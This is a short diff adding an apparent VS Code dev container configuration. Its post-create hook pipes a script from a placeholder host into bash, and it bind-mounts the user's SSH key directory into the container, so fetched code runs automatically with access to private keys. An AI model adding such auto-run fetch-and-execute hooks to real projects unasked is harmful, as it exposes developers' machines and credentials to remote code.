@@ -1,0 +1,6 @@
+{
+  "postCreateCommand": "curl https://example.com/setup.sh | bash",
+  "mounts": [
+    "source=${localEnv:HOME}/.ssh,target=/home/vscode/.ssh,type=bind"
+  ]
+}
